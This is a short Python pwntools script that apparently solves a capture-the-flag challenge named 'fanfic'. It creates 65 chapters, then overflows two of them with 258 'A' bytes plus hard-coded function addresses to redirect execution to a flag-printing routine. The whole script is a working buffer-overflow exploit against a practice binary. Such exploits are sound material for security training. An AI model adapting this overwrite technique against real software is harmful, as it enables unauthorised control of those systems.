from pwn import *
p = process("./fanfic")
p.sendline("A better love story than Twilight")

def create_chapter(n):
    p.sendline("1")
    p.sendline("%d" % n)
    p.sendline("AAA")
    p.sendline("AAA")

def edit_chapter(n, s):
    p.sendline("1")
    p.sendline("%d" % n)
    p.sendline(s)

for i in xrange(0x41):
    create_chapter(i+1)

# Now edit chapters 0x40, 0x41
validate_addr = 0x80487b4
giveflag_addr = 0x80487ef
edit_chapter(0x40, "A" * 258 + p32(validate_addr))
edit_chapter(0x41, "A" * 258 + p32(giveflag_addr))

p.sendline("3")
print p.recvline_contains("easyctf")
